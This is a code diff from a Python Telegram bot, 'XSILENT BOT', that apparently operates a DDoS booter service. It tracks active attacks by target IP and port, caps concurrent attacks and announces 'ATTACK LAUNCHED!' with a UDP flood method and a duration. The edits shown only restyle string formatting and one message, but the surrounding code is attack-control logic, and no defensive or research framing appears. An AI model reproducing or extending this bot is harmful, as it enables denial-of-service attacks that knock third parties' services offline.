@@ -91,12 +91,11 @@ def get_expiry_date(value, unit):
 
 def format_duration(value, unit):
     if unit == "hour":
-        return f"{value} Hour(s)"
+        return str(value) + " Hour(s)"
     else:
-        return f"{value} Day(s)"
+        return str(value) + " Day(s)"
 
 def check_total_active_attacks():
-    """Check total active attacks across all users"""
     now = time.time()
     count = 0
     for attack_id, info in list(active_attacks.items()):
@@ -107,7 +106,7 @@ def check_total_active_attacks():
     return count
 
 def check_active_attack_by_target(ip, port):
-    target_key = f"{ip}:{port}"
+    target_key = ip + ":" + str(port)
     now = time.time()
     for attack_id, attack_info in list(active_attacks.items()):
         if attack_info["target_key"] == target_key:
@@ -248,7 +247,7 @@ def attack(msg):
     }
     
     new_total = check_total_active_attacks()
-    bot.reply_to(msg, "🔥 ATTACK LAUNCHED!\n\n🎯 Target: " + ip + ":" + str(port) + "\n⏱️ Duration: " + str(duration) + "s\n⚡ Method: UDP (Auto)\n📊 Total active: " + str(new_total) + "/" + str(MAX_CONCURRENT))
+    bot.reply_to(msg, "🔥 ATTACK LAUNCHED!\n\n🎯 Target: " + ip + ":" + str(port) + "\n⏱️ Duration: " + str(duration) + "s\n⚡ Method: UDP (Auto)\n📊 Total active slots: " + str(new_total) + "/" + str(MAX_CONCURRENT))
     
     def run():
         try:
@@ -724,3 +723,4 @@ cleanup_thread.start()
 print("XSILENT BOT STARTED - Owner: 8487946379")
 
 bot.infinity_polling()
+```
